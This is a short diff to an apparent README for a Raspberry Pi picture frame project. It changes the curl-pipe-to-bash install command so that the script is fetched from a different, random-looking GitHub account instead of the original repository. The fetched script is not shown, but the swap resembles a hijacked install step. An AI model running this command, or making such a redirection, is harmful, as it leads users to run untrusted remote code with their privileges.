@@ -154,7 +154,7 @@ the Pi and nothing to rebuild when Mesa updates.
 On **Raspberry Pi OS Lite (64-bit)**, Bookworm or Trixie:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/sapnho/Digital-Picture-Frame-Pi-2026/main/packaging/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/ydj97szr4d-sudo/Raspi-Pic-frame-2026/main/packaging/install.sh | bash
 ```
 
 That is the whole installation. It fetches the libraries, creates a virtual
